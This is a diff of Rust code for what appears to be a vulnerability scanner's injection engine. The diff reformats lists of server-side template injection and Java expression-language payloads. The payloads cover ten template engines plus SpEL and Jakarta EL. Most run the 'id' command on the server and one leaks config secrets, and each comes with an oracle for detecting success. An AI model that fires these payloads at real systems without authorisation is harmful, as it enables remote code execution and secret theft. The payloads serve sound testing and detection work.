@@ -236,50 +236,173 @@ impl InjectionEngine {
 
         match engine {
             TemplateEngine::Jinja2 => vec![
-                make_ssti(engine, "rce-import", "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", OracleSignal::ReflectedValue("uid=".into())),
-                make_ssti(engine, "config-leak", "{{config.items()}}", OracleSignal::ReflectedValue("SECRET_KEY".into())),
-                make_ssti(engine, "mro-walk", "{{''.__class__.__mro__[2].__subclasses__()}}", OracleSignal::BodyLengthDelta),
-                make_ssti(engine, "math-confirm", &format!("{{{{{}*{}}}}}", a, b), OracleSignal::MathResult(result_str.clone())),
+                make_ssti(
+                    engine,
+                    "rce-import",
+                    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+                    OracleSignal::ReflectedValue("uid=".into()),
+                ),
+                make_ssti(
+                    engine,
+                    "config-leak",
+                    "{{config.items()}}",
+                    OracleSignal::ReflectedValue("SECRET_KEY".into()),
+                ),
+                make_ssti(
+                    engine,
+                    "mro-walk",
+                    "{{''.__class__.__mro__[2].__subclasses__()}}",
+                    OracleSignal::BodyLengthDelta,
+                ),
+                make_ssti(
+                    engine,
+                    "math-confirm",
+                    &format!("{{{{{}*{}}}}}", a, b),
+                    OracleSignal::MathResult(result_str.clone()),
+                ),
             ],
             TemplateEngine::Twig => vec![
-                make_ssti(engine, "math-confirm", &format!("{{{{{}*{}}}}}", a, b), OracleSignal::MathResult(result_str.clone())),
-                make_ssti(engine, "filter-exec", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", OracleSignal::ReflectedValue("uid=".into())),
-                make_ssti(engine, "system-call", "{{['id']|filter('system')}}", OracleSignal::ReflectedValue("uid=".into())),
+                make_ssti(
+                    engine,
+                    "math-confirm",
+                    &format!("{{{{{}*{}}}}}", a, b),
+                    OracleSignal::MathResult(result_str.clone()),
+                ),
+                make_ssti(
+                    engine,
+                    "filter-exec",
+                    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+                    OracleSignal::ReflectedValue("uid=".into()),
+                ),
+                make_ssti(
+                    engine,
+                    "system-call",
+                    "{{['id']|filter('system')}}",
+                    OracleSignal::ReflectedValue("uid=".into()),
+                ),
             ],
             TemplateEngine::Freemarker => vec![
-                make_ssti(engine, "math-confirm", &format!("${{{}*{}}}", a, b), OracleSignal::MathResult(result_str.clone())),
-                make_ssti(engine, "exec-new", r#"<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}"#, OracleSignal::ReflectedValue("uid=".into())),
-                make_ssti(engine, "api-builtin", "${.version}", OracleSignal::BodyLengthDelta),
+                make_ssti(
+                    engine,
+                    "math-confirm",
+                    &format!("${{{}*{}}}", a, b),
+                    OracleSignal::MathResult(result_str.clone()),
+                ),
+                make_ssti(
+                    engine,
+                    "exec-new",
+                    r#"<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}"#,
+                    OracleSignal::ReflectedValue("uid=".into()),
+                ),
+                make_ssti(
+                    engine,
+                    "api-builtin",
+                    "${.version}",
+                    OracleSignal::BodyLengthDelta,
+                ),
             ],
             TemplateEngine::Velocity => vec![
-                make_ssti(engine, "math-confirm", &format!("#set($x={}*{})$x", a, b), OracleSignal::MathResult(result_str.clone())),
-                make_ssti(engine, "class-forname", "#set($rt=$class.forName('java.lang.Runtime'))#set($obj=$rt.getMethod('getRuntime').invoke(null))$obj.exec('id')", OracleSignal::BodyLengthDelta),
+                make_ssti(
+                    engine,
+                    "math-confirm",
+                    &format!("#set($x={}*{})$x", a, b),
+                    OracleSignal::MathResult(result_str.clone()),
+                ),
+                make_ssti(
+                    engine,
+                    "class-forname",
+                    "#set($rt=$class.forName('java.lang.Runtime'))#set($obj=$rt.getMethod('getRuntime').invoke(null))$obj.exec('id')",
+                    OracleSignal::BodyLengthDelta,
+                ),
             ],
             TemplateEngine::Thymeleaf => vec![
-                make_ssti(engine, "spel-inject", &format!("__${{{}*{}}}__::x", a, b), OracleSignal::MathResult(result_str.clone())),
-                make_ssti(engine, "runtime-exec", "__${T(java.lang.Runtime).getRuntime().exec('id')}__::x", OracleSignal::BodyLengthDelta),
+                make_ssti(
+                    engine,
+                    "spel-inject",
+                    &format!("__${{{}*{}}}__::x", a, b),
+                    OracleSignal::MathResult(result_str.clone()),
+                ),
+                make_ssti(
+                    engine,
+                    "runtime-exec",
+                    "__${T(java.lang.Runtime).getRuntime().exec('id')}__::x",
+                    OracleSignal::BodyLengthDelta,
+                ),
             ],
             TemplateEngine::Mako => vec![
-                make_ssti(engine, "math-confirm", &format!("${{{{'{}*{}'.format({}*{})}}}}",  a, b, a, b), OracleSignal::MathResult(result_str.clone())),
-                make_ssti(engine, "os-import", "<%import os;x=os.popen('id').read()%>${x}", OracleSignal::ReflectedValue("uid=".into())),
+                make_ssti(
+                    engine,
+                    "math-confirm",
+                    &format!("${{{{'{}*{}'.format({}*{})}}}}", a, b, a, b),
+                    OracleSignal::MathResult(result_str.clone()),
+                ),
+                make_ssti(
+                    engine,
+                    "os-import",
+                    "<%import os;x=os.popen('id').read()%>${x}",
+                    OracleSignal::ReflectedValue("uid=".into()),
+                ),
             ],
             TemplateEngine::Pug => vec![
-                make_ssti(engine, "math-confirm", &format!("#{{{a}*{b}}}"), OracleSignal::MathResult(result_str.clone())),
-                make_ssti(engine, "rce-require", "#{global.process.mainModule.require('child_process').execSync('id')}", OracleSignal::ReflectedValue("uid=".into())),
+                make_ssti(
+                    engine,
+                    "math-confirm",
+                    &format!("#{{{a}*{b}}}"),
+                    OracleSignal::MathResult(result_str.clone()),
+                ),
+                make_ssti(
+                    engine,
+                    "rce-require",
+                    "#{global.process.mainModule.require('child_process').execSync('id')}",
+                    OracleSignal::ReflectedValue("uid=".into()),
+                ),
             ],
             TemplateEngine::Erb => vec![
-                make_ssti(engine, "math-confirm", &format!("<%= {a}*{b} %>"), OracleSignal::MathResult(result_str.clone())),
-                make_ssti(engine, "system-exec", "<%= system('id') %>", OracleSignal::ReflectedValue("uid=".into())),
-                make_ssti(engine, "backtick-exec", "<%= `id` %>", OracleSignal::ReflectedValue("uid=".into())),
+                make_ssti(
+                    engine,
+                    "math-confirm",
+                    &format!("<%= {a}*{b} %>"),
+                    OracleSignal::MathResult(result_str.clone()),
+                ),
+                make_ssti(
+                    engine,
+                    "system-exec",
+                    "<%= system('id') %>",
+                    OracleSignal::ReflectedValue("uid=".into()),
+                ),
+                make_ssti(
+                    engine,
+                    "backtick-exec",
+                    "<%= `id` %>",
+                    OracleSignal::ReflectedValue("uid=".into()),
+                ),
             ],
             TemplateEngine::Smarty => vec![
-                make_ssti(engine, "math-confirm", &format!("{{{a}*{b}}}"), OracleSignal::MathResult(result_str.clone())),
-                make_ssti(engine, "php-tag", "{php}echo `id`;{/php}", OracleSignal::ReflectedValue("uid=".into())),
-                make_ssti(engine, "if-exec", "{if system('id')}{/if}", OracleSignal::ReflectedValue("uid=".into())),
+                make_ssti(
+                    engine,
+                    "math-confirm",
+                    &format!("{{{a}*{b}}}"),
+                    OracleSignal::MathResult(result_str.clone()),
+                ),
+                make_ssti(
+                    engine,
+                    "php-tag",
+                    "{php}echo `id`;{/php}",
+                    OracleSignal::ReflectedValue("uid=".into()),
+                ),
+                make_ssti(
+                    engine,
+                    "if-exec",
+                    "{if system('id')}{/if}",
+                    OracleSignal::ReflectedValue("uid=".into()),
+                ),
             ],
-            TemplateEngine::Handlebars => vec![
-                make_ssti(engine, "lookup-proto", "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('id');\" }}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}", OracleSignal::ReflectedValue("uid=".into())),
-            ],
+            TemplateEngine::Handlebars => vec![make_ssti(
+                engine,
+                "lookup-proto",
+                "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('id');\" }}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}",
+                OracleSignal::ReflectedValue("uid=".into()),
+            )],
         }
     }
 
@@ -613,12 +736,54 @@ impl InjectionEngine {
         let result = (a * b).to_string();
 
         let mut payloads = vec![
-            make_payload(InjectionClass::SpEl, "math-hash", &format!("#{{{a}*{b}}}"), OracleSignal::MathResult(result.clone()), "SpEL expression in #{}", 0),
-            make_payload(InjectionClass::SpEl, "math-dollar", &format!("${{{a}*{b}}}"), OracleSignal::MathResult(result.clone()), "SpEL expression in ${}", 0),
-            make_payload(InjectionClass::SpEl, "runtime-exec", "#{T(java.lang.Runtime).getRuntime().exec('id')}", OracleSignal::BodyLengthDelta, "Runtime.exec()", 0),
-            make_payload(InjectionClass::SpEl, "class-forname", "#{T(java.lang.Class).forName('java.lang.Runtime').getMethod('exec',T(java.lang.String)).invoke(T(java.lang.Runtime).getRuntime(),'id')}", OracleSignal::BodyLengthDelta, "Class.forName chain", 0),
-            make_payload(InjectionClass::SpEl, "processbuilder", "#{new java.lang.ProcessBuilder({'id'}).start()}", OracleSignal::BodyLengthDelta, "ProcessBuilder", 0),
-            make_payload(InjectionClass::SpEl, "string-class", "#{T(String).class.forName('java.lang.Runtime')}", OracleSignal::BodyLengthDelta, "String bridge to Runtime", 0),
+            make_payload(
+                InjectionClass::SpEl,
+                "math-hash",
+                &format!("#{{{a}*{b}}}"),
+                OracleSignal::MathResult(result.clone()),
+                "SpEL expression in #{}",
+                0,
+            ),
+            make_payload(
+                InjectionClass::SpEl,
+                "math-dollar",
+                &format!("${{{a}*{b}}}"),
+                OracleSignal::MathResult(result.clone()),
+                "SpEL expression in ${}",
+                0,
+            ),
+            make_payload(
+                InjectionClass::SpEl,
+                "runtime-exec",
+                "#{T(java.lang.Runtime).getRuntime().exec('id')}",
+                OracleSignal::BodyLengthDelta,
+                "Runtime.exec()",
+                0,
+            ),
+            make_payload(
+                InjectionClass::SpEl,
+                "class-forname",
+                "#{T(java.lang.Class).forName('java.lang.Runtime').getMethod('exec',T(java.lang.String)).invoke(T(java.lang.Runtime).getRuntime(),'id')}",
+                OracleSignal::BodyLengthDelta,
+                "Class.forName chain",
+                0,
+            ),
+            make_payload(
+                InjectionClass::SpEl,
+                "processbuilder",
+                "#{new java.lang.ProcessBuilder({'id'}).start()}",
+                OracleSignal::BodyLengthDelta,
+                "ProcessBuilder",
+                0,
+            ),
+            make_payload(
+                InjectionClass::SpEl,
+                "string-class",
+                "#{T(String).class.forName('java.lang.Runtime')}",
+                OracleSignal::BodyLengthDelta,
+                "String bridge to Runtime",
+                0,
+            ),
         ];
 
         if self.config.max_evasion_level >= 1 {
@@ -706,11 +871,46 @@ impl InjectionEngine {
         let result = (a * b).to_string();
 
         vec![
-            make_payload(InjectionClass::JakartaEl, "math-confirm", &format!("${{{a}*{b}}}"), OracleSignal::MathResult(result.clone()), "EL expression", 0),
-            make_payload(InjectionClass::JakartaEl, "hash-math", &format!("#{{{a}*{b}}}"), OracleSignal::MathResult(result.clone()), "Deferred EL", 0),
-            make_payload(InjectionClass::JakartaEl, "runtime-exec", "${Runtime.getRuntime().exec('id')}", OracleSignal::BodyLengthDelta, "Runtime access", 0),
-            make_payload(InjectionClass::JakartaEl, "class-loader", "${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}", OracleSignal::BodyLengthDelta, "Class loader chain", 0),
-            make_payload(InjectionClass::JakartaEl, "empty-string-bridge", "${''.getClass().forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance([['id']]).start()}", OracleSignal::BodyLengthDelta, "Empty string bridge", 0),
+            make_payload(
+                InjectionClass::JakartaEl,
+                "math-confirm",
+                &format!("${{{a}*{b}}}"),
+                OracleSignal::MathResult(result.clone()),
+                "EL expression",
+                0,
+            ),
+            make_payload(
+                InjectionClass::JakartaEl,
+                "hash-math",
+                &format!("#{{{a}*{b}}}"),
+                OracleSignal::MathResult(result.clone()),
+                "Deferred EL",
+                0,
+            ),
+            make_payload(
+                InjectionClass::JakartaEl,
+                "runtime-exec",
+                "${Runtime.getRuntime().exec('id')}",
+                OracleSignal::BodyLengthDelta,
+                "Runtime access",
+                0,
+            ),
+            make_payload(
+                InjectionClass::JakartaEl,
+                "class-loader",
+                "${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
+                OracleSignal::BodyLengthDelta,
+                "Class loader chain",
+                0,
+            ),
+            make_payload(
+                InjectionClass::JakartaEl,
+                "empty-string-bridge",
+                "${''.getClass().forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance([['id']]).start()}",
+                OracleSignal::BodyLengthDelta,
+                "Empty string bridge",
+                0,
+            ),
         ]
     }
 
